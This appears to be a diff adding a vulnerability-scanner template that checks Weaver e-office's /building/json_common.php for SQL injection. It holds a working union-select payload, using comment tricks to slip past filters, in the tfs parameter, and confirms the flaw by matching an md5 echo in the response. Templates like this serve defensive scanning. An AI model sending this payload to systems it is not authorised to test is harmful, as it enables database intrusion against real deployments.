@@ -1,0 +1,25 @@
+id: poc-yaml-weaver-e-office-json-common-php-sqli
+info:
+  name: 泛微 e-office json_common.php SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: sql-injection
+variables:
+  t1: "{{rand_int(1,100)}}"
+http:
+  - raw:
+      - |
+        POST /building/json_common.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,md5({{t1}}),4#|2|333
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{md5(t1)}}"
